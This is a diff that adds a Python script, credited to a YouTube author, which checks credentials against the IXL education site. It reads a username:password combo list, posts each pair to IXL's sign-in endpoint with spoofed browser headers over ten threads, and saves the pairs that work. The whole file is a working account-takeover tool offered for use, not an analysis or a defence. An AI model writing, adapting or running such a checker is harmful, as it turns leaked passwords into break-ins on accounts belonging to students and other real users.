@@ -1,0 +1,74 @@
+# ---------- Ahmed swailm -------------#
+# ---------- youtube.com/ahmedswailm -#
+
+from multiprocessing.dummy import Pool
+from tkinter import Tk
+from tkinter.filedialog import askopenfilename
+
+# ======== {1} ====================
+import os
+import requests
+from colorama import Fore
+
+# =========== {2} ===================
+clear = lambda: os.system("cls")
+os.system("title Simple Checker by AhmedSWailm")
+root: Tk = Tk();
+root.withdraw();
+requests.urllib3.disable_warnings()
+
+
+# ============ {3} =================
+
+class checker():
+    def __init__(self):
+        self.name = "ixl Checker by Ahmed Swailm"
+        self.url = "https://www.ixl.com/signin/ajax"
+        self.payload = {'showMiniSignin': 'true'}
+        self.file = askopenfilename(title="Chose your combo fie :")
+        self.combo = [i.strip() for i in open(self.file, "r")]
+        self.len = len(self.combo)
+        self.hits = 0
+        self.invalid = 0
+        self.checked = 0
+        self.bot = 0
+        self.headers = {'Host': 'www.ixl.com', 'Connection': 'keep-alive', 'DNT': '1',
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Edg/83.0.478.54',
+                        'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*',
+                        'Origin': 'https://www.ixl.com',
+                        'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
+                        'Referer': 'https://www.ixl.com/'}
+
+    def run(self, account):
+        user, password = account.split(":")[0], account.split(":")[1]
+        data = "username=" + user + "&password=" + password + "&qlsubmit=true"
+        r = requests.post(self.url, params=self.payload, headers=self.headers, data=data)
+        if "False" in r.json():
+            self.hits += 1
+            print(Fore.GREEN + user + ":" + password + "| valid Login")
+            with open("Valid.txt", "w", encoding="utf8", errors="ignores") as valid:
+                valid.write(user + ":" + password + "\n")
+        else:
+            self.invalid += 1
+            print(Fore.CYAN + user + ":" + password + "| Not valid Login")
+            with open("invalid.txt", "w", encoding="utf8", errors="ignores") as notvalid:
+                notvalid.write(user + ":" + password + "\n")
+        self.bot += 1
+
+    def results(self):
+        clear()
+        print(Fore.GREEN + self.name)
+        print(Fore.CYAN + "Checked" + "        " + str(self.bot) + "/" + str(self.len))  # checked/allcombo
+        print(Fore.CYAN + "Hits" + "           " + Fore.GREEN + str(self.hits))
+        print(Fore.CYAN + "invalid" + "        " + Fore.RED + str(self.invalid))
+
+
+# ==================== {4} ===============
+check = checker()
+mp = Pool(10)  # number of bots
+mp.map(check.run, check.combo)
+mp.close()
+mp.join()
+
+check.results()
